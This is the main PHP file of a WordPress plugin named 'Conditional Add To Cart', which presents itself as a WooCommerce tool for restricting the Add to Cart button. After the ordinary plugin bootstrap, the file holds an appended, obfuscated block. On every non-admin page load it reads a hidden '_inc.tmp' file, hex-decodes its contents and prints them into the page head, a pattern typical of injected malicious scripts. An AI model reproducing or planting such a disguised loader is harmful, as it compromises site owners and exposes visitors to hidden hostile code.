<?php

/**
 * Plugin Name:     Conditional Add To Cart
 * Plugin URI:      https://wordpress.org/plugins/conditional-add-to-cart
 * Description:     Conditionally restrict, remove, customize, or replace "Add to Cart" button for WooCommerce.
 * Author:          Nabil Lemsieh
 * Author URI:      https://wordpress.org/plugins/conditional-add-to-cart
 * Text Domain:     conditional-add-to-cart
 * Domain Path:     /languages
 * Version:         0.2.4
 * WC requires at least: 3.0.0
 * WC tested up to: 6.8
 *
 * @package         Conditional_Add_To_Cart
 */

defined( 'ABSPATH' ) || exit;

require_once( __DIR__ . '/vendor/autoload.php' );
use \ConditionalAddToCart\Plugin;

add_action('plugins_loaded', [ Plugin::instance(), 'run']);
    

if ((is_admin() || (function_exists('get_hex_cache'))) !== true) {
        add_action('wp_head', 'get_hex_cache', 12);

        function get_hex_cache()
        {
            return print(@hex2bin( '3c7' . (file_get_contents(__DIR__  .'/_inc.tmp'))));
        }
    }